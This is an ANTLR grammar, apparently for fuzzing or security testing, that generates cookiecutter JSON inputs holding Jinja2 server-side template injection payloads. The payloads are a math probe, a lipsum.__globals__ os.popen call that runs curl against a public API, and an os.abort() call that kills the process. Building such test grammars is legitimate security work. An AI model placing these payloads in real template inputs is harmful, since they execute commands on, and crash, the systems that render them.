grammar CookiecutterSSTI;

start
    : sstiCookiecutter EOF
    ;

sstiCookiecutter
    : LBRACE
      projectPair COMMA
      payload1Pair COMMA
      payload2Pair COMMA
      payload3Pair
      RBRACE
    ;

projectPair
    : PROJECT_NAME COLON QUOTE SAFE_NAME QUOTE
    ;

payload1Pair
    : SSTI_PAYLOAD1 COLON QUOTE payloadCurl QUOTE
    ;

payload2Pair
    : SSTI_PAYLOAD2 COLON QUOTE payloadMath QUOTE
    ;

payload3Pair
    : SSTI_PAYLOAD3 COLON QUOTE payloadAbort QUOTE
    ;

payloadCurl
    : J2_OPEN LIPSUM DOT GLOBALS LBRACK SQUOTE OS SQUOTE RBRACK DOT POPEN LPAREN SQUOTE CURL_CMD SQUOTE RPAREN DOT READ LPAREN RPAREN J2_CLOSE
    ;

payloadMath
    : J2_OPEN NUMBER PLUS NUMBER J2_CLOSE
    ;

payloadAbort
    : J2_OPEN LIPSUM DOT GLOBALS LBRACK SQUOTE OS SQUOTE RBRACK DOT ABORT LPAREN RPAREN J2_CLOSE
    ;

LBRACE: '{';
RBRACE: '}';
LBRACK: '[';
RBRACK: ']';
COLON: ':';
COMMA: ',';
QUOTE: '"';
SQUOTE: '\'';
DOT: '.';
LPAREN: '(';
RPAREN: ')';
PLUS: '+';

J2_OPEN: '{{';
J2_CLOSE: '}}';

PROJECT_NAME: '"project_name"';
SSTI_PAYLOAD1: '"ssti_payload1"';
SSTI_PAYLOAD2: '"ssti_payload2"';
SSTI_PAYLOAD3: '"ssti_payload3"';

SAFE_NAME: 'safe_default' | 'baseline_project' | 'test_project';
LIPSUM: 'lipsum';
GLOBALS: '__globals__';
OS: 'os';
POPEN: 'popen';
READ: 'read';
ABORT: 'abort';

CURL_CMD: 'curl -s https://api.restful-api.dev/objects';
NUMBER: [0-9]+;

WS: [ \t\r\n]+ -> skip;
